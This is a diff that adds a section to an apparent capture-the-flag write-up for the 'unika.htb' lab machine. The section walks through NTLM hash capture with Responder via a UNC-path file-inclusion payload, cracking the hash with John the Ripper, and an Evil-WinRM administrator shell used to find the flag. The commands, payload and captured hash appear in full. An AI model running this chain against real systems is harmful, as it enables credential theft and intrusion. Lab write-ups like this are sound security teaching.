@@ -2061,6 +2061,203 @@ Refreshing the webpage, we have successfully revealed the windows host file:
 
 ![Screenshot_2022-07-23_13_00_17](https://user-images.githubusercontent.com/59018247/180615211-7307b681-512d-426e-ae9a-510f6769b0e8.png)
 
+We can now take this one step further and exploit the NTLM authentication using a tool called responder.
+
+```
+└─$ sudo responder -I tun0          
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.87]
+    Responder IPv6             [dead:beef:2::1055]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-LC8NZWB450S]
+    Responder Domain Name      [W4NH.LOCAL]
+    Responder DCE-RPC Port     [49336]
+
+[+] Listening for events...                                                                                                           
+
+```
+Now that responder is ready, we can try access any file by exploiting the page parameter. We can try:
+
+```
+http://unika.htb/?page=//{Our IP Address}/test
+```
+![Screenshot_2022-07-23_14_44_41](https://user-images.githubusercontent.com/59018247/180618805-7a30ee7e-b45f-4874-a0af-7cf7a4c16d3c.png)
+
+It appears to be a success! In our terminal, Responder captured the following credentials:
+
+```
+[SMB] NTLMv2-SSP Client   : ::ffff:10.129.4.31
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:5420717e47baee4c:5BC65B6C5DBAFACCC013D4E153364A24:010100000000000000F02A29A29ED8012DED954E423C776E0000000002000800570034004E00480001001E00570049004E002D004C00430038004E005A0057004200340035003000530004003400570049004E002D004C00430038004E005A005700420034003500300053002E00570034004E0048002E004C004F00430041004C0003001400570034004E0048002E004C004F00430041004C0005001400570034004E0048002E004C004F00430041004C000700080000F02A29A29ED80106000400020000000800300030000000000000000100000000200000F5704D73064BBD67A5F54D3D2A95D86C25036B6515DB9B3A27E75D60FDA94EBF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380037000000000000000000     
+```
+
+We now have a username and hash. We can try cracking the hash using the popular tool John the Ripper.
+
+```
+└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+badminton        (Administrator)     
+1g 0:00:00:00 DONE (2022-07-23 14:50) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+This attack was successful and we now aquired the credentials of Administrator/badmitton. If we recalled earlier, port 5985 was open, for WinRM. We can investigate that port next to see if the information we gathered thus far was useful.
+
+Since we are using Kali Linux, we can use a tool called Evil-WinRM to connect to the WinRM service (being a native windows application).
+
+```
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.129.4.31 -u administrator -p badminton
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                     
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+
+Our username and password were accepted! We can now browse the filesystem.  
+                
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---        10/11/2020   7:19 AM                3D Objects
+d-r---        10/11/2020   7:19 AM                Contacts
+d-r---          3/9/2022   5:34 PM                Desktop
+d-r---         3/10/2022   4:51 AM                Documents
+d-r---        10/11/2020   7:19 AM                Downloads
+d-r---        10/11/2020   7:19 AM                Favorites
+d-r---        10/11/2020   7:19 AM                Links
+d-r---        10/11/2020   7:19 AM                Music
+d-r---         4/27/2020   6:01 AM                OneDrive
+d-r---        10/11/2020   7:19 AM                Pictures
+d-r---        10/11/2020   7:19 AM                Saved Games
+d-r---        10/11/2020   7:19 AM                Searches
+d-r---        10/11/2020   7:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Downloads
+*Evil-WinRM* PS C:\Users\Administrator\Downloads> dir
+*Evil-WinRM* PS C:\Users\Administrator\Downloads> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/9/2022   5:35 PM                Administrator
+d-----          3/9/2022   5:33 PM                mike
+d-r---        10/10/2020  12:37 PM                Public
+
+
+*Evil-WinRM* PS C:\Users> cd mike
+*Evil-WinRM* PS C:\Users\mike> ls
+
+
+    Directory: C:\Users\mike
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/10/2022   4:51 AM                Desktop
+
+
+*Evil-WinRM* PS C:\Users\mike> cd Desktop
+*Evil-WinRM* PS C:\Users\mike\Desktop> ls
+
+
+    Directory: C:\Users\mike\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\mike\Desktop> 
+```
+After some directory hoping, we finally found the tenth flag located at ``` Directory: C:\Users\mike\Desktop```!
+
+
+
 
 
 
